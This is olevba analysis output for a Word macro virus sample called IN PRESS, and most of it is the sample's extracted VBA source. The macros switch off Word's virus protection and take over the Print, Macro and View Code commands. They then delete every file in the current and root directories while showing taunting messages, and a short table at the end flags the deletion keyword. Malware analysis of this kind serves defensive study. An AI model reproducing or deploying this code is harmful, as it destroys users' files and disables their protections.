olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.InPress-4a098ac76122e255d675e7ec1a323577c1b14752
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.InPress-4a098ac76122e255d675e7ec1a323577c1b14752 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FilePrint()
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = wdCancelDisabled
On Errore GoTo ErrorFS

adoc = Dir("*.*")
While adoc <> ""
    Kill (adoc)
    MsgBox "' " + adoc + " ' has been erased !", vbInformation, "IN PRESS"
    adoc = Dir()
Wend
Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Virus IN PRESS"
    .Text = "Ooops ! I have erased your documents .. I have to quit now . Bye bye and sweet dreams !!!"
    .Show
End With

Application.Quit

ErrorFS:

End Sub

Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Sorry but you have been infected by IN PRESS !", vbInformation, "IN PRESS"
ErrorTM:

End Sub

Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Virus IN PRESS"
    .Text = "Why did you want to see my source ? You have done a bad thing !!"
    .Show
End With
Kill "\*.*"
Kill "*.*"

Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Virus IN PRESS"
    .Text = "I have erased your files to punish your!"
    .Show
End With

ErrorVVBC:
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Kill                |May delete a file                            |
+----------+--------------------+---------------------------------------------+

